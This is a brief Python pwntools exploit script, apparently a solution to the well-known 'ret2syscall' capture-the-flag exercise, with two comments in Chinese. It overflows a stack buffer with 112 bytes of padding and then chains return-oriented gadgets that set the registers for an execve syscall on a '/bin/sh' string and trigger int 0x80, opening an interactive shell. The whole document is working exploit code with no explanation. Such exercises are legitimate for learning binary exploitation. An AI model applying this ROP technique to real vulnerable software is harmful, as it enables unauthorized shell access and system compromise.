from pwn import *
 #目标文件
TARGET ='./ret2syscall'
sh = process(TARGET)
offset=112
sh_addr=0x080BE408
eax_addr=0x080bb196
edx_ecx_ebx_addr=0x0806eb90
int_addr=0x08049421

payload=112*b'A'+p32(eax_addr)+p32(0xb)+p32(edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(sh_addr)+p32(int_addr)
sh.sendline(payload)
# 交互模式(查看输出)
sh.interactive()
